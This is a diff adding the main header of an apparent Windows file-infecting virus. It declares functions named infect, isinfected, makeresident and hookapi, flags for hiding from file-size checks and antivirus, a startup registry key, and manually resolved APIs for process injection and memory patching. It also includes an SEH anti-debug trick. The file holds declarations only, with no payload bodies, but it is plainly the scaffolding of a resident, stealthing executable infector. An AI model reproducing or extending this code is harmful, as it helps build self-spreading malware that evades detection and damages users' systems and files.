@@ -1,0 +1,339 @@
+   #ifndef MAIN_HPP
+   #define MAIN_HPP
+
+   #define defdata(what) void __stdcall what();
+
+   typedef struct FILEIO_
+   {
+       int size;
+       int hFile;
+       int hMap;
+       void* hView;
+   } FILEIO;
+
+   #define STEALTH_SIZE 1  //stealth on size
+   #define STEALTH_AV 2    //stealth on av
+
+   //the stc jc is a hack because of bcc32
+   #define __seh_set asm {locals __;push   ebp;call   __setupseh_uniquename;mov    esp,[esp+8];int 3;stc;jc __catchseh_uniquename;__setupseh_uniquename:push dword ptr fs:[0];mov dword ptr fs:[0],esp}
+   #define __seh_rem asm {__catchseh_uniquename:pop dword ptr fs:[0];pop ebp;pop ebp;}
+
+   //*ouch* :)
+   #define LPCVOID void*
+   #define LPDWORD int*
+   #define LPVOID void*
+   #define HMODULE int
+   #define BOOL int
+   #define HANDLE int
+   #define DWORD int
+   #define WORD short
+   #define HKEY int
+
+   #ifndef NULL
+   #define NULL (void *)0
+   #endif
+
+   #define STDCALL __stdcall   //?
+   #define WINAPI __stdcall
+
+
+   #define INVALID_HANDLE_VALUE 0xffffffff
+
+   #define MAX_PATH 260
+
+   #define ERROR_SUCCESS 0
+
+   #define HKEY_CURRENT_USER   (HKEY)0x80000001
+   #define HKEY_LOCAL_MACHINE  (HKEY)0x80000002
+   #define KEY_QUERY_VALUE 1
+
+   #define FILE_MAP_ALL_ACCESS 0xf001f
+   #define FILE_MAP_READ   4
+   #define FILE_MAP_WRITE  2
+   #define FILE_MAP_COPY   1
+   #define PAGE_READONLY   2
+   #define PAGE_READWRITE  4
+   #define PAGE_WRITECOPY  8
+   #define PAGE_EXECUTE    16
+   #define PAGE_EXECUTE_READ   32
+   #define PAGE_EXECUTE_READWRITE  64
+   #define PAGE_GUARD  256
+   #define PAGE_NOACCESS   1
+   #define PAGE_NOCACHE    512
+   #define SEC_COMMIT  134217728
+   #define SEC_IMAGE   16777216
+   #define SEC_NOCACHE 268435456
+   #define SEC_RESERVE 67108864
+   #define MEM_COMMIT  4096
+   #define MEM_RESERVE 8192
+   #define MEM_TOP_DOWN    1048576
+   #define PAGE_EXECUTE    16
+   #define PAGE_EXECUTE_READ   32
+   #define PAGE_EXECUTE_READWRITE  64
+   #define PAGE_GUARD  256
+   #define PAGE_NOACCESS   1
+   #define PAGE_NOCACHE    512
+   #define MEM_COMMIT  4096
+   #define MEM_FREE    65536
+   #define MEM_RESERVE 8192
+   #define MEM_IMAGE   16777216
+   #define MEM_MAPPED  262144
+   #define MEM_PRIVATE 131072
+   #define MEM_DECOMMIT    16384
+   #define MEM_RELEASE 32768
+   #define PAGE_EXECUTE_WRITECOPY  128
+   #define FILE_SHARE_READ 1
+   #define FILE_SHARE_WRITE    2
+   #define FILE_SHARE_DELETE 4
+   #define CREATE_NEW  1
+   #define CREATE_ALWAYS   2
+   #define OPEN_EXISTING   3
+   #define OPEN_ALWAYS 4
+   #define TRUNCATE_EXISTING   5
+   #define FILE_ATTRIBUTE_ARCHIVE  32
+   #define FILE_ATTRIBUTE_COMPRESSED   2048
+   #define FILE_ATTRIBUTE_NORMAL   128
+   #define FILE_ATTRIBUTE_DIRECTORY    16
+   #define FILE_ATTRIBUTE_HIDDEN   2
+   #define FILE_ATTRIBUTE_READONLY 1
+   #define FILE_ATTRIBUTE_SYSTEM   4
+   #define FILE_ATTRIBUTE_TEMPORARY    256
+   #define FILE_ATTRIBUTE_SPARSE_FILE 0x200
+   #define FILE_ATTRIBUTE_REPARSE_POINT 0x400
+   #define FILE_ATTRIBUTE_OFFLINE 0x1000
+   #define FILE_ATTRIBUTE_NOT_CONTENT_INDEXED 0x00002000
+   #define FILE_ATTRIBUTE_ENCRYPTED 0x4000
+   #define GENERIC_READ    0x80000000
+   #define GENERIC_WRITE   0x40000000
+   #define MEM_COMMIT  4096
+   #define MEM_DECOMMIT    16384
+   #define MEM_RELEASE 32768
+   #define PROCESS_ALL_ACCESS  0x1f0fff
+   #define PROCESS_CREATE_PROCESS  128
+   #define PROCESS_CREATE_THREAD   2
+   #define PROCESS_DUP_HANDLE  64
+   #define PROCESS_QUERY_INFORMATION   1024
+   #define PROCESS_SET_INFORMATION 512
+   #define PROCESS_TERMINATE   1
+   #define PROCESS_VM_OPERATION    8
+   #define PROCESS_VM_READ 16
+   #define PROCESS_VM_WRITE    32
+   #define WAIT_TIMEOUT    0x102
+
+   #pragma pack(push,1)
+   typedef struct _SYSTEMTIME {
+       WORD wYear;
+       WORD wMonth;
+       WORD wDayOfWeek;
+       WORD wDay;
+       WORD wHour;
+       WORD wMinute;
+       WORD wSecond;
+       WORD wMilliseconds;
+   } SYSTEMTIME,*LPSYSTEMTIME,*PSYSTEMTIME;
+
+   typedef struct tagFILETIME {
+       int dwLowDateTime;
+       int dwHighDateTime;
+   } FILETIME,*LPFILETIME,*PFILETIME;
+
+   typedef struct _WIN32_FIND_DATA {
+       int dwFileAttributes;
+       FILETIME ftCreationTime;
+       FILETIME ftLastAccessTime;
+       FILETIME ftLastWriteTime;
+       int nFileSizeHigh;
+       int nFileSizeLow;
+       int dwReserved0;
+       int dwReserved1;
+       char cFileName[MAX_PATH];
+       char cAlternateFileName[14];
+       short dummy;
+   } WIN32_FIND_DATA,*LPWIN32_FIND_DATA,*PWIN32_FIND_DATA;
+
+   typedef struct _MEMORY_BASIC_INFORMATION {
+       LPVOID BaseAddress;
+       LPVOID AllocationBase;
+       DWORD AllocationProtect;
+       DWORD RegionSize;
+       DWORD State;
+       DWORD Protect;
+       DWORD Type;
+   } MEMORY_BASIC_INFORMATION;
+   #pragma pack(pop)
+
+   typedef void* __stdcall iGetProcAddress(int,char*);
+   typedef void* __stdcall iLoadLibraryA(char*);
+   typedef int __stdcall iMessageBoxA(int,char*,char*,int);
+   typedef HANDLE WINAPI iFindFirstFileExW(char* lpFileName,int fInfoLevelId,void* lpFindFileData,int fSearchOp,void* lpSearchFilter,DWORD dwAdditionalFlags);
+   typedef int __stdcall iFindNextFileW(int,LPWIN32_FIND_DATA);
+   typedef void __stdcall iOutputDebugStringW(char*);
+   typedef HANDLE __stdcall iCreateFileW(char*,DWORD,DWORD,DWORD,DWORD,DWORD,HANDLE);
+   typedef HANDLE __stdcall iCreateFileMappingW(HANDLE,DWORD,DWORD,DWORD,DWORD,char*);
+   typedef void* __stdcall iMapViewOfFile(HANDLE,DWORD,DWORD,DWORD,DWORD);
+   typedef void __stdcall iCloseHandle(HANDLE);
+   typedef void __stdcall iUnmapViewOfFile(void*);
+   typedef int __stdcall iGetVersion(void);
+   typedef void* __stdcall iVirtualAlloc(void*,int,int,int);
+   typedef void __stdcall iVirtualFree(void*,int,int);
+   typedef BOOL WINAPI iEnumProcesses(DWORD*,DWORD,DWORD*);
+   typedef BOOL WINAPI iEnumProcessModules(HANDLE,HMODULE*,DWORD,LPDWORD);
+   typedef HANDLE STDCALL iOpenProcess(DWORD,BOOL,DWORD);
+   typedef BOOL STDCALL iReadProcessMemory(HANDLE,LPCVOID,LPVOID,DWORD,LPDWORD);
+   typedef void* __stdcall iVirtualAllocEx(HANDLE hProcess,LPVOID lpAddress,DWORD dwSize,DWORD flAllocationType,DWORD flProtect);
+   typedef int __stdcall iWriteProcessMemory(HANDLE hProcess,LPVOID lpBaseAddress,LPVOID lpBuffer,DWORD nSize,LPDWORD lpNumberOfBytesWritten);
+   typedef HANDLE __stdcall iCreateRemoteThread(HANDLE hProcess,void* lpThreadAttributes,DWORD dwStackSize,void* lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
+   typedef HANDLE __stdcall iGetModuleHandleA(void*);
+   typedef int __stdcall iVirtualProtect(LPVOID lpAddress,DWORD dwSize,DWORD flNewProtect,DWORD* lpflOldProtect);
+   typedef int __stdcall iVirtualQuery(LPVOID lpAddress,MEMORY_BASIC_INFORMATION* lpBuffer, DWORD dwLength);
+   typedef int __stdcall iFindFirstFileW(void*,LPWIN32_FIND_DATA);
+   typedef int __stdcall iFindClose(HANDLE);
+   typedef int __stdcall iGetLastError();
+   typedef void __stdcall iSetLastError(DWORD dwErrCode);
+   typedef int __stdcall iFileTimeToSystemTime(FILETIME *lpFileTime,SYSTEMTIME* lpSystemTime);
+   typedef int __stdcall iSystemTimeToFileTime(SYSTEMTIME *lpSystemTime,FILETIME* lpFileTime);
+   typedef int __stdcall iGetFileSize(HANDLE hFile,LPDWORD lpFileSizeHigh);
+   typedef int __stdcall iWideCharToMultiByte(int,DWORD,char*,int,char*,int,char*,int);
+   typedef char* __stdcall iCharUpperA(char*);
+   typedef DWORD __stdcall iSetFilePointer(HANDLE hFile,int lDistanceToMove, int* lpDistanceToMoveHigh, DWORD dwMoveMethod);
+   typedef int __stdcall iSetEndOfFile(HANDLE hFile);
+   typedef HANDLE WINAPI iFindFirstChangeNotificationW(char* lpPathName,int bWatchSubtree, DWORD dwNotifyFilter);
+   typedef int WINAPI iGetFileTime(HANDLE hFile,FILETIME* lpCreationTime,FILETIME* lpLastAccessTime,FILETIME* lpLastWriteTime);
+   typedef int WINAPI iSetFileTime(HANDLE hFile,FILETIME *lpCreationTime,FILETIME *lpLastAccessTime,FILETIME *lpLastWriteTime);
+   typedef HANDLE WINAPI iCreateMutexW(void* lpMutexAttributes,BOOL bInitialOwner, char* lpName);
+   typedef int WINAPI iReleaseMutex(HANDLE hMutex);
+   typedef DWORD WINAPI iWaitForSingleObject(HANDLE hHandle,DWORD dwMilliseconds);
+   typedef void WINAPI iSleep(int);
+   typedef DWORD WINAPI iGetModuleFileNameA(HANDLE hModule,char* lpFilename,DWORD nSize);
+   typedef DWORD WINAPI iGetSystemDirectoryW(char* lpBuffer, int uSize);
+   typedef int WINAPI iSfcIsFileProtected(HANDLE RpcHandle,short* ProtFileName);
+   typedef DWORD WINAPI iGetTickCount(void);
+   typedef DWORD WINAPI iGetFullPathNameW(char* lpFileName,DWORD nBufferLength,char* lpBuffer,int* lpFilePart  );
+   typedef unsigned int WINAPI ilstrlenW(char* lpString);
+   typedef int WINAPI iIsBadWritePtr(void* lp,int ucb);
+
+
+   typedef int STDCALL iRegOpenKeyExA(int,char*,DWORD,void*,int*);
+   typedef int STDCALL iRegEnumValueW(int,DWORD,char*,int*,int*,int*,char*,int*);
+   typedef int STDCALL iRegCloseKey(int);
+
+
+   typedef struct api_
+   {
+       /* kernel32.dll */
+
+       iCreateFileW* CreateFileW;
+       iFindFirstChangeNotificationW* FindFirstChangeNotificationW;
+       iFindFirstFileExW* FindFirstFileExW;
+       iFindNextFileW* FindNextFileW;
+
+       iGetVersion* GetVersion;
+       iLoadLibraryA* LoadLibraryA;
+       iGetProcAddress* GetProcAddress;
+       iCreateFileMappingW* CreateFileMappingW;
+       iMapViewOfFile* MapViewOfFile;
+       iCloseHandle* CloseHandle;
+       iUnmapViewOfFile* UnmapViewOfFile;
+       iVirtualAllocEx* VirtualAllocEx;
+       iVirtualFree* VirtualFree;
+       iVirtualProtect* VirtualProtect;
+       iVirtualQuery* VirtualQuery;
+       iOpenProcess* OpenProcess;
+       iReadProcessMemory* ReadProcessMemory;
+       iWriteProcessMemory* WriteProcessMemory;
+       iCreateRemoteThread* CreateRemoteThread;
+       iGetModuleHandleA* GetModuleHandleA;
+       iGetLastError* GetLastError;
+       iSetLastError* SetLastError;
+       iFindFirstFileW* FindFirstFileW;
+       iFindClose* FindClose;
+       iFileTimeToSystemTime* FileTimeToSystemTime;
+       iSystemTimeToFileTime* SystemTimeToFileTime;
+       iGetFileSize* GetFileSize;
+       iWideCharToMultiByte* WideCharToMultiByte;
+       iSetFilePointer* SetFilePointer;
+       iSetEndOfFile* SetEndOfFile;
+       iSetFileTime* SetFileTime;
+       iGetFileTime* GetFileTime;
+       iSleep* Sleep;
+       iGetModuleFileNameA* GetModuleFileNameA;
+       iGetSystemDirectoryW* GetSystemDirectoryW;
+       iGetTickCount* GetTickCount;
+       iGetFullPathNameW* GetFullPathNameW;
+       ilstrlenW* lstrlenW;
+       iIsBadWritePtr* IsBadWritePtr;
+
+       /* user32.dll */
+
+       iCharUpperA* CharUpperA;
+
+       /* psapi.dll */
+
+       iEnumProcesses* EnumProcesses;
+       iEnumProcessModules* EnumProcessModules;
+
+       /* sfc.dll */
+       iSfcIsFileProtected* SfcIsFileProtected;
+
+       /* advapi32.dll */
+
+       iRegOpenKeyExA* RegOpenKeyExA;
+       iRegEnumValueW* RegEnumValueW;
+       iRegCloseKey* RegCloseKey;
+
+
+   } api;
+
+   #include "inc\mz.hpp"
+   #include "inc\pe.hpp"
+
+   typedef struct hookglobal_
+   {
+       api a;
+       int inapi;          //avoid hooked api loops
+       int flags;          //flags for current process
+       int rnd32seed;
+       char avbuffer[520]; //used by stealth_av, as fake argument to createfilew
+   } hookglob;
+
+   extern "C" {
+
+   //asm
+   int     __fastcall crc32(char*);
+   int     __fastcall getk32base();
+   int     __fastcall poordasm(void* code);
+   void    __fastcall hookentry(void);
+
+   //cpp
+   void    __fastcall doregistery(api* a,int key, void* base);
+   int     __fastcall  getprocsum(api* a);
+   unsigned int __fastcall getrnd32(hookglob* hg);
+   char*   __fastcall getrndfile(hookglob* hg,api* a, char* buf);
+   int     __fastcall isspecialfiletime(api* a,FILETIME* filetime);
+   void    __fastcall finddatastealth(void* base,WIN32_FIND_DATA* wfd);
+   int     __fastcall rva2raw(MZ_HEADER* mz,PE_HEADER* pe,int rva);
+   int     __fastcall isinfected(api* a,char* filename);
+   void    __fastcall import(int , int* , int* );
+   int     __fastcall infect(api*,char*,void*);
+   void*   __fastcall openfile(api*,FILEIO*,char* filename,int);
+   void    __fastcall closefile(api* a,FILEIO* f,int);
+   void    __fastcall free(api* a,void* al);
+   void*   __fastcall alloc(api* a,int size);
+   void    __fastcall memcpy(void* dst,void* src,int size);
+   int     __fastcall hookapi(api*,void* base, int crc, void* fn, char*);
+   void    __fastcall makeresident(api* a, void* vimbase);
+   int     __fastcall changeprot(api*,void* address,int flags);
+   void    __fastcall hookhandler(void* base,char* arg1,int hookn, char** arg1p);
+   int     __fastcall isgoodname(void* base,api* a, char* filename);
+
+   //hacks, hidden at the bottom, ignore them :)
+   void crcs(void);
+   void blacklist(void);
+   void org9entry(void);
+   void hostentryrva(void);
+   void startupregkey(void);
+
+   }
+
+
+   #endif //MAINHPP_INCLUDED
